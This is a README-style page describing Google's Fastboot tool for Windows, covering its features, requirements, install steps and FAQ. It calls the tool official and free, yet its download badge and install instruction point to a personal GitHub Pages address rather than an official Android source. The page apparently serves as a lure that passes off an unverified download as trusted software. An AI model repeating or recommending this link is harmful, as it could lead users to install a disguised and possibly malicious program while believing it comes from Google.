# Fastboot

<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgUmJlmeIe638rybfd-JB1TEUFDX1f_v6gz3wczBVkNA&s=10" alt="Fastboot logo" width="72"/>

[![Download Fastboot](https://img.shields.io/badge/⬇_Download_Fastboot-00ACC1?style=for-the-badge)](https://stevenmorales29.github.io/.github/Fastboot-Tool-App)

Fastboot is a command-line Android SDK Platform-Tools utility for Windows that lets developers flash firmware images and communicate with an Android device while it sits in fastboot mode.

> **Tip:** Run `fastboot devices` first to confirm Windows can see your connected device before sending any other command.

<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSLCPamxRZtvz1KzyvqIseETRTAkWFd8xrpfGnh3A9nihGDK--K-1ojKTM&s=10" alt="Fastboot Screenshot" width="100%"/>

## Overview
Fastboot for Windows is Google's official command-line protocol and tool for talking to an Android device's bootloader instead of its running operating system. It ships inside the Android SDK Platform-Tools package alongside ADB, and developers reach for it to flash partition images, check device state, and recover a device that won't boot normally.

## Features
- [x] Flash individual partitions or full images to an Android device
- [x] Query bootloader and device information with `fastboot getvar`
- [x] Lock or unlock the bootloader for development work
- [x] Reboot a device between fastboot mode, recovery, and normal startup

## Requirements
Fastboot runs on any currently supported 64-bit edition of Windows and needs little more than a working USB port, a data-capable USB cable, and the correct device driver for your Android hardware installed on the PC.

## Install
- [ ] Download the Android SDK Platform-Tools package for Windows using the button above.
- [ ] Extract the archive to a folder of your choice — no separate installer runs.

## Start
Open a Command Prompt or PowerShell window in that extracted folder and run `fastboot devices` to make sure your Android device is recognized before you try flashing anything.

## FAQ
**What is fastboot?** It's Google's command-line tool and device protocol for flashing images and querying an Android device while it is in its bootloader. **Is Fastboot free?** Yes — it is distributed at no cost as part of the Android SDK Platform-Tools. **Does it work with any Android phone?** Most Android devices support fastboot mode, though some manufacturers restrict certain fastboot commands, like bootloader unlocking, on specific models.

## Support
Fastboot doesn't ship a graphical help center, but running it with its help flag from the command line lists every supported command and option. Beyond that, Android's official developer documentation covers setup, USB driver troubleshooting, and detailed command references for anyone getting stuck.
